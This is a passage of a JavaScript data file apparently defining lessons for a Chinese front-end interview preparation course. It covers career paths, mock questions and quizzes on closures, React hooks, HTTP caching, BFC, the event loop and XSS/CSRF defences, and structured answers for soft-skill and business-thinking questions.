            orientation: 'vertical',
            items: [
              { time: '初级 0-2 年', title: '基础能力建设', description: 'HTML/CSS/JS 基础扎实，掌握一个框架（React/Vue），能独立完成模块开发。重点：多写代码、读源码、建立知识体系。', status: 'done' },
              { time: '中级 2-4 年', title: '深度与广度', description: '深入框架原理（Fiber/Diff/响应式），掌握工程化（Webpack/Vite/CI/CD），了解全栈（Node.js）。能负责完整项目。', status: 'active' },
              { time: '高级 4-6 年', title: '架构与优化', description: '系统设计能力（微前端/组件库/监控系统），性能优化方法论，团队协作（Code Review/技术分享）。能带 3-5 人小组。', status: 'pending' },
              { time: '资深 6+ 年', title: '技术驱动业务', description: '技术选型决策，跨团队协作，技术规划与落地。选择方向：技术专家（架构师）/ 技术管理（TL/EM）/ 全栈（产品技术）。', status: 'pending' },
            ],
          },
        },
        {
          id: 'iv-p14-3',
          type: 'callout',
          variant: 'info',
          title: '三条发展路径',
          text: '技术专家（IC）：深耕技术，成为某一领域的专家（架构师/性能专家）。技术管理（EM）：带团队，关注人/流程/交付。全栈/创业：技术+产品+业务，独立负责产品线或创业。没有最好的路径，只有最适合的。',
        },
      ],
    },

    // ========================================================================
    // 知识点 15：面试模拟题
    // ========================================================================
    {
      order: 15,
      title: '面试模拟题',
      difficulty: 2,
      visualizationType: 'quiz',
      blocks: [
        {
          id: 'iv-p15-1',
          type: 'paragraph',
          lead: true,
          text: '通过模拟面试计时器和综合测验检验面试准备程度。模拟面试随机抽题、限时回答；综合测验覆盖全领域知识点。',
        },
        {
          id: 'iv-p15-2',
          type: 'demo',
          visualizationType: 'mock-interview-timer',
          data: {
            defaultTimePerQuestion: 3,
            questions: [
              { id: 'mock-1', domain: 'javascript', question: '什么是闭包？举例说明其应用场景。', shortAnswer: '函数+词法作用域，内部函数可访问外部变量。', detailedAnswer: '闭包是函数与其词法作用域的组合。应用：数据私有化、模块化、柯里化。', difficulty: 'medium', tags: ['闭包'], keyPoints: ['函数+作用域', '应用场景'] },
              { id: 'mock-2', domain: 'react', question: 'React Hooks 的使用规则？', shortAnswer: '只在顶层调用、只在 React 函数中调用。', detailedAnswer: '1. 只在顶层调用（不能在条件/循环中）2. 只在函数组件或自定义 Hook 中调用。', difficulty: 'medium', tags: ['Hooks'], keyPoints: ['顶层调用', 'React 函数中'] },
              { id: 'mock-3', domain: 'network', question: 'HTTP 缓存策略的完整流程？', shortAnswer: '强缓存→协商缓存，Cache-Control/ETag/Last-Modified。', detailedAnswer: '强缓存不发请求直接用，协商缓存发请求验证 304。', difficulty: 'hard', tags: ['缓存'], keyPoints: ['强缓存', '协商缓存'] },
              { id: 'mock-4', domain: 'css', question: 'BFC 的触发条件和应用场景？', shortAnswer: 'float/position/display/overflow 触发，应用：清浮动/避免 margin 重叠。', detailedAnswer: 'BFC 是独立渲染区域。触发：float≠none、position=absolute/fixed、display=flex/grid、overflow≠visible。', difficulty: 'medium', tags: ['BFC'], keyPoints: ['触发条件', '应用场景'] },
              { id: 'mock-5', domain: 'security', question: 'XSS 和 CSRF 的区别及防御？', shortAnswer: 'XSS 注入脚本，CSRF 冒用身份。XSS 转义，CSRF Token。', detailedAnswer: 'XSS 在页面注入恶意脚本，防御：输出转义/CSP。CSRF 冒用用户身份发请求，防御：CSRF Token/SameSite Cookie。', difficulty: 'medium', tags: ['安全'], keyPoints: ['XSS vs CSRF', '防御方案'] },
              { id: 'mock-6', domain: 'javascript', question: '事件循环中宏任务和微任务的执行顺序？', shortAnswer: '同步→微任务→宏任务，微任务每次清空。', detailedAnswer: '调用栈清空后先执行所有微任务，再取一个宏任务。Promise.then 是微任务，setTimeout 是宏任务。', difficulty: 'hard', tags: ['事件循环'], keyPoints: ['微任务优先', '每次清空'] },
            ],
          },
        },
        {
          id: 'iv-p15-3',
          type: 'demo',
          visualizationType: 'progress-dashboard',
          data: {
            domainTotals: {
              javascript: 45,
              css: 31,
              react: 31,
              vue: 31,
              network: 31,
              security: 6,
              engineering: 0,
              react19: 0,
              testing: 0,
              handwriting: 0,
            },
          },
        },
        {
          id: 'iv-p15-4',
          type: 'demo',
          visualizationType: 'quiz',
          data: {
            questions: [
              {
                question: '闭包的本质是什么？',
                options: ['函数与其词法作用域的组合', '函数内部的局部变量', '全局作用域的变量', '箭头函数的 this'],
                correctIndex: 0,
                explanation: '闭包 = 函数 + 词法作用域的引用。内部函数被返回后仍持有对外部作用域变量的引用，这就是闭包。',
              },
              {
                question: 'React Diff 算法中 key 的作用是？',
                options: ['美化列表', '帮助 React 识别元素变化', '提高渲染速度', '替代 id 属性'],
                correctIndex: 1,
                explanation: 'key 帮助 React 识别列表中哪些元素发生了变化（添加/删除/重排序），从而最小化 DOM 操作。用 index 作 key 在列表顺序变化时会导致性能和状态问题。',
              },
              {
                question: 'HTTP 强缓存和协商缓存的区别是？',
                options: ['强缓存需要请求，协商缓存不需要', '强缓存不请求直接用，协商缓存发请求验证', '两者完全相同', '协商缓存优先于强缓存'],
                correctIndex: 1,
                explanation: '强缓存（Cache-Control/Expires）命中时浏览器直接用缓存不发请求；协商缓存（ETag/Last-Modified）需发请求验证，304 则用缓存。强缓存优先级更高。',
              },
              {
                question: 'useEffect 和 useLayoutEffect 的关键区别是？',
                options: ['参数不同', 'useLayoutEffect 同步阻塞绘制，useEffect 异步', 'useEffect 只能用一次', 'useLayoutEffect 不能访问 DOM'],
                correctIndex: 1,
                explanation: 'useLayoutEffect 在 DOM 变更后同步执行（阻塞绘制），适合读取 DOM 布局并立即修改避免闪烁。useEffect 在绘制后异步执行，不阻塞。',
              },
              {
                question: 'XSS 攻击的防御方案不包括以下哪个？',
                options: ['输入过滤/输出转义', 'CSP 内容安全策略', 'HttpOnly Cookie', 'CSRF Token'],
                correctIndex: 3,
                explanation: 'CSRF Token 是防御 CSRF（跨站请求伪造）的方案，不是防御 XSS 的。XSS 防御：输出转义、CSP、HttpOnly Cookie、输入过滤。',
              },
              {
                question: '事件循环中，以下代码的输出顺序是？\nconsole.log(1); setTimeout(()=>console.log(2),0); Promise.resolve().then(()=>console.log(3)); console.log(4);',
                options: ['1,2,3,4', '1,4,3,2', '1,3,4,2', '1,4,2,3'],
                correctIndex: 1,
                explanation: '同步代码先执行（1,4），然后清空微任务队列（3），最后取宏任务执行（2）。所以输出 1,4,3,2。',
              },
              {
                question: 'BFC 的触发条件不包括以下哪个？',
                options: ['float: left', 'position: absolute', 'display: block', 'overflow: hidden'],
                correctIndex: 2,
                explanation: 'display: block 不会触发 BFC。触发 BFC：float≠none、position=absolute/fixed、display=flex/grid/inline-block/table-cell、overflow≠visible。',
              },
              {
                question: 'STAR 法则中的 R 代表什么？',
                options: ['Role（角色）', 'Result（结果）', 'Review（回顾）', 'Reason（原因）'],
                correctIndex: 1,
                explanation: 'STAR = Situation（情境）+ Task（任务）+ Action（行动）+ Result（结果）。R 代表 Result，要用量化数据说明成果。',
              },
            ],
          },
        },
      ],
    },

    // ========================================================================
    // 知识点 16：软技能与协作
    // ========================================================================
    {
      order: 16,
      title: '软技能与协作',
      difficulty: 2,
      visualizationType: 'accordion',
      blocks: [
        {
          id: 'iv-p16-1',
          type: 'paragraph',
          lead: true,
          text: '高级别面试中软技能是关键考察点。沟通协作、冲突解决、向上管理决定了你能否在团队中放大技术价值。下方折叠面板按场景给出结构化回答框架。',
        },
        {
          id: 'iv-p16-2',
          type: 'demo',
          visualizationType: 'accordion',
          data: {
            defaultOpen: [0],
            items: [
              {
                title: '沟通协作：跨团队需求对齐',
                content: '考察：能否主动拉通产品/设计/后端/测试，避免信息差导致返工。结构化回答："背景→关键干系人→对齐机制→产出"。',
                code: `✅ "重构商品详情页涉及 4 个团队。我先与产品对齐目标指标（首屏≤1.5s），
   再与后端约定 SSR 数据契约（字段+超时降级），
   与设计约定图片占位避免 CLS，
   与测试共建性能回归用例（Lighthouse CI）。
   每周开 15 分钟站会同步风险，最终按期交付。"`,
                codeLanguage: 'text',
              },
              {
                title: '冲突解决：技术方案分歧',
                content: '考察：能否用数据和目标决策，而非情绪或权威。结构：复述对方观点→共同目标→数据对比→权衡结论→事后复盘。',
                code: `✅ "关于状态管理选 Redux 还是 Zustand，A 同学坚持 Redux 生态成熟。
   我先复述他的顾虑（团队熟悉度），明确共同目标是降低维护成本。
   然后列对比：同等场景 Redux 模板代码 80 行 vs Zustand 25 行，
   学习曲线 2 天 vs 0.5 天。最终团队投票选 Zustand 并补齐迁移文档。
   事后复盘：把"成熟度"细化为可量化指标更高效。"`,
                codeLanguage: 'text',
              },
              {
                title: '向上管理：如何向上汇报风险',
                content: '考察：能否提前预警而非事后救火，给领导决策选项而非只报问题。结构：现状→影响→根因→方案 A/B+C→推荐。',
                code: `✅ "上线前 2 天发现支付接口 P99 800ms（SLA 500ms）。
   影响：大促可能超时失败，预估影响订单 5%。
   根因：下游风控同步调用。
   方案 A：降级跳过风控（有资损风险，1 天可上线）；
   方案 B：风控异步化（无资损但需 3 天，赶不上大促）；
   方案 C：保留同步但加超时降级+补偿（2 天，资损可控 0.1%）。
   推荐方案 C，已与风控对齐，请决策是否启动应急预案。"`,
                codeLanguage: 'text',
              },
              {
                title: '团队贡献：如何带动他人',
                content: '考察：能否从个人产出升级为团队赋能。避免只说"我做了"，要体现"我让团队变得更好"。',
                code: `✅ "除完成自身需求外，我做三件事：
   1. 沉淀：把踩过的坑写成 12 篇内网技术文章，新人上手时间从 2 周→1 周
   2. 工具：开发 CLI 自动生成模板代码，团队重复劳动减少 30%
   3. 培养：带 1 名应届生，每周 1on1，3 个月后独立负责一个模块
   结果：季度获团队贡献奖，晋升答辩时这是技术影响力的关键佐证。"`,
                codeLanguage: 'text',
              },
            ],
          },
        },
        {
          id: 'iv-p16-3',
          type: 'callout',
          variant: 'warning',
          title: '软技能回答的常见反例',
          text: '1) 只讲结果不讲过程（"我们上线了"→ 缺你的角色）；2) 用"我们"掩盖个人贡献（面试官想听"你"做了什么）；3) 把冲突描述为人际矛盾（应聚焦目标与数据）；4) 向上管理变成"传话筒"（要带方案而非只报问题）。',
        },
        {
          id: 'iv-p16-4',
          type: 'demo',
          visualizationType: 'interview-quiz-engine',
          data: {
            domain: 'javascript',
            mode: 'sequential',
            questions: [
              {
                id: 'soft-cross-team',
                domain: 'javascript',
                question: '讲一次你跨团队协作的经历，你是如何对齐目标和推进的？',
                shortAnswer: '结构：背景→关键干系人→对齐机制（站会/契约/文档）→产出与复盘。突出主动拉通和信息透明。',
                detailedAnswer: '回答框架：\n1. 背景：项目类型 + 涉及团队 + 你的角色\n2. 关键干系人：列出产品/后端/设计/测试各自的关注点\n3. 对齐机制：\n   - 目标对齐：先与产品确认核心指标（可量化）\n   - 契约对齐：与后端约定接口字段+超时降级\n   - 流程对齐：定期站会同步风险，文档化决策\n4. 产出：按时交付 + 量化结果\n5. 复盘：哪一步可以更早对齐避免返工\n\n核心信号词：主动、提前、量化、复盘。',
                difficulty: 'medium',
                tags: ['软技能', '协作', '面试必考'],
                keyPoints: ['结构：背景→干系人→对齐→产出→复盘', '主动拉通而非被动响应', '量化结果', '复盘体现成长'],
              },
              {
                id: 'soft-conflict',
                domain: 'javascript',
                question: '讲一次你与技术方案有分歧的经历，如何解决？',
                shortAnswer: '复述对方观点→明确共同目标→数据对比→权衡结论→事后复盘。聚焦目标与数据，不聚焦个人。',
                detailedAnswer: '回答框架：\n1. 复述对方观点：表明你理解了他的顾虑（而非 strawman）\n2. 共同目标：明确双方都在追求什么（如降低维护成本）\n3. 数据对比：列具体指标（代码量、性能、学习曲线、维护成本）\n4. 权衡结论：说明最终选择 + 理由（可能不是你的方案，体现开放性）\n5. 事后复盘：把"分歧"沉淀为团队决策标准\n\n避坑：\n- 不说对方"固执/不懂"\n- 不把技术分歧描述为人际矛盾\n- 不回避分歧（"都听他的"显得无主见）\n- 体现"对事不对人"的职业性',
                difficulty: 'hard',
                tags: ['软技能', '冲突解决'],
                keyPoints: ['复述对方观点显尊重', '聚焦共同目标', '用数据决策', '事后复盘沉淀标准'],
              },
              {
                id: 'soft-upward',
                domain: 'javascript',
                question: '讲一次你向上级汇报风险的经历，你的处理方式？',
                shortAnswer: '提前预警而非事后救火，给方案 A/B/C + 推荐而非只报问题。结构：现状→影响→根因→方案→推荐。',
                detailedAnswer: '回答框架：\n1. 现状：风险是什么（客观描述，不夸大）\n2. 影响：量化影响（影响订单 X%、资损 Y 元、上线延迟 Z 天）\n3. 根因：技术根因（不是甩锅）\n4. 方案 A/B/C：每个方案的优劣（成本/风险/时间）\n5. 推荐：你推荐哪个 + 理由 + 已做的预备工作\n\n关键信号：\n- 提前预警（上线前 2 天 vs 上线当天）\n- 带方案而非传话筒\n- 已与相关方对齐（不是把锅甩给领导）\n- 体现"我已尽力，现在需要决策"\n\n反例：\n- 只报问题不给方案（"出问题了您看怎么办"）\n- 临时抱佛脚（上线当天才说）\n- 甩锅（"是后端的问题"）',
                difficulty: 'hard',
                tags: ['软技能', '向上管理'],
                keyPoints: ['提前预警非事后救火', '结构：现状→影响→根因→方案→推荐', '带方案而非传话', '已与相关方对齐'],
              },
            ],
          },
        },
      ],
    },

    // ========================================================================
    // 知识点 17：业务理解与产品思维
    // ========================================================================
    {
      order: 17,
      title: '业务理解与产品思维',
      difficulty: 3,
      visualizationType: 'comparetable',
      blocks: [
        {
          id: 'iv-p17-1',
          type: 'paragraph',
          lead: true,
          text: '高级前端必须从"实现需求"升级到"理解业务、参与产品决策"。下方对比表区分三类考察维度，问答引擎覆盖高频业务题。',
        },
        {
          id: 'iv-p17-2',
          type: 'demo',
          visualizationType: 'comparetable',
          data: {
            featureColumn: '考察维度',
            columns: ['核心问题', '回答框架', '常见反例'],
            highlightColumn: 0,
            rows: [
              { feature: '业务理解', values: ['你做这个功能为业务带来什么价值？', '用户画像→核心场景→关键指标→你的贡献', '只讲技术不讲业务目标'] },
              { feature: '产品思维', values: ['如果让你做产品经理，你会怎么设计？', '用户痛点→MVP→数据验证→迭代', '只懂执行不懂为什么这么设计'] },
              { feature: '数据驱动', values: ['你怎么知道你的优化有效？', '指标定义→埋点→AB 实验→显著性', '只优化不衡量，或只看 PV 不看转化'] },
              { feature: '技术-业务取舍', values: ['业务要快上线 vs 技术要重构，你怎么决策？', '影响面→技术债→风险→分阶段方案', '一刀切（全重构 or 全堆叠）'] },
              { feature: '用户视角', values: ['你如何看待"用户反馈卡顿"？', '复现→定位→量化→优先级→闭环', '只说"我优化了"不量化效果'] },
            ],
          },
        },
        {
          id: 'iv-p17-3',
          type: 'callout',
          variant: 'tip',
          title: '为何前端要有产品思维？',
          text: '前端是离用户最近的工程师，能最早感知体验问题。把"产品让我做"变成"我建议产品做"，是高级前端的核心差异化。量化业务影响（转化率/留存/营收）比技术指标更打动面试官。',
        },
        {
          id: 'iv-p17-4',
          type: 'demo',
          visualizationType: 'interview-quiz-engine',
          data: {
            domain: 'javascript',
            mode: 'sequential',
            questions: [
              {
                id: 'biz-value',
                domain: 'javascript',
                question: '讲一个你做过的功能，它对业务的价值是什么？',
                shortAnswer: '结构：用户画像→核心场景→关键业务指标→你的技术贡献。突出业务结果（转化/留存/营收），技术只是手段。',
                detailedAnswer: '回答框架：\n1. 用户画像：这个功能服务谁（C 端用户/B 端商家/内部运营）\n2. 核心场景：用户在什么场景下用（购物决策/后台管理/数据看板）\n3. 关键业务指标：转化率/留存/客单价/运营效率\n4. 你的技术贡献：技术方案如何支撑指标（性能/体验/稳定性）\n5. 结果：量化业务结果（转化率↑X%、运营效率↑X 倍）\n\n例：商品详情页性能优化\n- 业务目标：提升转化率（不是"优化性能"）\n- 你的贡献：首屏 3.5s→1.2s，Lighthouse 45→92\n- 业务结果：转化率 2.1%→3.8%，月营收↑120 万\n\n核心信号词：业务目标、量化结果、技术如何支撑业务。',
                difficulty: 'hard',
                tags: ['业务理解', '产品思维', '面试必考'],
                keyPoints: ['用户画像→场景→指标→贡献→结果', '业务目标优先于技术目标', '量化业务结果', '技术是手段业务是目的'],
              },
              {
                id: 'biz-tradeoff',
                domain: 'javascript',
                question: '业务要快上线 vs 技术要重构，你如何决策？',
                shortAnswer: '评估影响面+技术债+风险，给分阶段方案：先 MVP 满足业务，再排期重构还债。避免一刀切（全堆叠或全重构）。',
                detailedAnswer: '决策框架：\n1. 影响面评估：\n   - 不重构的风险（Bug 率、维护成本、扩展困难）\n   - 不上线的成本（错过窗口期、竞品先发）\n2. 技术债量化：\n   - 维护耗时（每次改需求多花 X 小时）\n   - Bug 率（每千行 Bug 数）\n   - 扩展困难度（加新功能是否需大改）\n3. 风险评估：\n   - 重构风险：引入新 Bug、延期\n   - 堆叠风险：技术债滚雪球，未来更难还\n4. 分阶段方案（推荐）：\n   - Phase 1：MVP 堆叠上线（满足业务窗口）\n   - Phase 2：抽象核心模块（降低耦合）\n   - Phase 3：渐进重构（按模块切换）\n5. 沟通：把权衡讲给产品/PM，由业务方拍板优先级\n\n核心：不替业务做决定，但给清晰的成本/风险/时间权衡，让业务方基于信息决策。',
                difficulty: 'hard',
                tags: ['技术债', '决策', '产品思维'],
                keyPoints: ['评估影响面+技术债+风险', '给分阶段方案而非一刀切', '量化技术债（维护耗时/Bug 率）', '让业务方拍板优先级'],
              },
              {
                id: 'biz-data-driven',
                domain: 'javascript',
                question: '你怎么衡量你做的优化是否有效？讲一次 AB 实验经历。',
                shortAnswer: '定义指标→埋点采集→AB 实验→统计显著性（p<0.05）→决策。避免只优化不衡量，或只看 PV 不看转化。',
                detailedAnswer: '数据驱动流程：\n1. 指标定义：\n   - 北极星指标：业务核心（转化率/留存）\n   - 过程指标：技术指标（首屏/FCP/TTI）\n   - 护栏指标：不能恶化的指标（崩溃率/错误率）\n2. 埋点采集：\n   - 前端埋点：SDK 采集用户行为+性能\n   - 坑点：采样率、丢失补偿、上报时机\n3. AB 实验：\n   - 分流：随机分桶，保证两组用户画像一致\n   - 周期：至少 1-2 周覆盖周期波动\n   - 流量：保证统计功效（通常每组 > 1 万 UV）\n4. 统计显著性：\n   - p 值 < 0.05 才认为有差异\n   - 看置信区间而非点估计\n   - 警惕辛普森悖论（分组与总体结论相反）\n5. 决策：\n   - 显著正向→全量上线\n   - 显著负向→回滚+复盘\n   - 不显著→分析是否样本不足或真无影响\n\n例：图片懒加载 AB 实验\n- 指标：首屏 FCP + 转化率 + 崩溃率\n- 结果：FCP ↓40%（显著），转化率无显著变化\n- 决策：上线（性能提升且不伤转化）',
                difficulty: 'hard',
                tags: ['数据驱动', 'AB 实验', '产品思维'],
                keyPoints: ['北极星+过程+护栏三类指标', 'AB 实验需分流+周期+流量', 'p<0.05 才显著', '看置信区间非点估计'],
              },
            ],
          },
        },
        {
          id: 'iv-p17-5',
          type: 'callout',
          variant: 'warning',
          title: '业务题回答的常见反例',
          text: '1) 只讲技术指标不讲业务结果（"首屏降了 2s"→ 对业务影响是什么？）；2) 用"产品让我做"掩盖思考缺失（应主动建议）；3) AB 实验只看 p 值不看置信区间；4) 技术债决策只讲"必须重构"不讲成本权衡。',
        },
      ],
    },
  ],
}
